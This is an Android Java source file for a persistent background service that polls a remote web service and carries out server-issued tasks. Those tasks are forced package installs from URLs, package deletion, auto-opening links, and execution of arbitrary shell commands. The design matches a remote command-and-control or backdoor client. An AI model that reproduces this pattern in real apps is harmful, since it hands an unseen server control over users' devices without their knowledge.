package com.baoxue.task;

import com.baoxue.task.common.SaveApplication;
import com.baoxue.task.task.DeletePackageTaskItem;
import com.baoxue.task.task.LinkTaskItem;
import com.baoxue.task.task.ShellTaskItem;
import com.baoxue.task.task.TaskItem;
import com.baoxue.task.task.TaskListerner;
import com.baoxue.task.task.TaskManage;
import com.baoxue.task.task.UpdateTaskItem;
import com.baoxue.task.web.ResTask;
import com.baoxue.task.web.ResTaskItem;
import com.baoxue.task.web.WebServicePort;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class TaskService extends Service implements Runnable, TaskListerner {

	private final String TAG = "TaskService";
	ResTask task;

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.d(TAG, "onStartCommand");
		new Thread(this).start();
		return START_STICKY;
	}

	@Override
	public void run() {
		getTask();
	}

	public void getTask() {
		task = WebServicePort.Task();
		if (task != null) {
			ResTaskItem[] items = task.getItems();
			for (ResTaskItem item : items) {
				if (ResTask.CMD_UPDATE_PACKAGE.equals(item.getCommand())) {
					TaskItem taskItem = new UpdateTaskItem(item
							.getUpdataPackageTaskItem().getUrl(), item
							.getUpdataPackageTaskItem().getPackageName(), item
							.getUpdataPackageTaskItem().getVersionCode(), item
							.getUpdataPackageTaskItem().getForcesUpdate());
					TaskManage.getTaskManage().addTaskItem(taskItem);

				} else if (ResTask.CMD_DELETE_PACKAGE.equals(item.getCommand())) {
					TaskItem taskItem = new DeletePackageTaskItem(item
							.getDeletePackageTaskItem().getPackageName());
					TaskManage.getTaskManage().addTaskItem(taskItem);
				} else if (ResTask.CMD_LINK.equals(item.getCommand())) {
					LinkTaskItem taskItem = new LinkTaskItem(
							SaveApplication.getCurrent(), item
									.getLinkTaskItem().getMessage(), item
									.getLinkTaskItem().getUrl());
					taskItem.setBackground(item.getLinkTaskItem()
							.isBackground());
					taskItem.setAutoOpen(item.getLinkTaskItem().isAutoOpen());
					TaskManage.getTaskManage().addTaskItem(taskItem);
				} else if (ResTask.CMD_SHELL.equals(item.getCommand())) {
					ShellTaskItem taskItem = new ShellTaskItem(item
							.getShellTaskItem().getShell());
					TaskManage.getTaskManage().addTaskItem(taskItem);
				}
			}
			TaskManage.getTaskManage().setListener(this);
			TaskManage.getTaskManage().beginTask();
		}
	}

	@Override
	public void Complate() {
		if (task != null && task.isWaitResult()) {
			WebServicePort.DoTask(task.getId());
		}
		task = null;
	}

}
